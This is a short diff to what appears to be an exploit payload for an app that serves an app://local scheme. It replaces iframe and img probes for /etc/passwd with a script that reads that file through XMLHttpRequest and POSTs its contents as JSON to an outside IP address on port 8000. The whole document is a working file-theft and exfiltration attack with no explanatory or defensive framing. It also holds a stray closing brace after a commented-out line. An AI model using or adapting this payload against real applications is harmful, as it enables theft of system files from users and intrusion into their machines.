@@ -1,5 +1,28 @@
-<iframe style='width:500px;height:500px' src="app://local/etc/passwd"></iframe>
-<img src='app://local/etc/passwd'>
+<script>
+function sleep(ms) {
+  const wakeUpTime = Date.now() + ms;
+  while (Date.now() < wakeUpTime) {}
+}
+var x = new XMLHttpRequest();
+x.open("GET","app://local/etc/passwd");
+x.send();
+sleep(1000)
+if(x.readyState == 4){
+console.log(x.response);
+const xhr = new XMLHttpRequest();
+const method = "POST";
+const url = "http://35.90.246.90:8000/";
 
+const data = {
+    value: x.response
+};
 
-<form><button>a</button></form>
+xhr.open(method, url);
+xhr.setRequestHeader('Content-Type', 'application/json');
+
+//xhr.addEventListener('readystatechange', function (event) {
+});
+
+xhr.send(JSON.stringify(data));
+}
+</script>
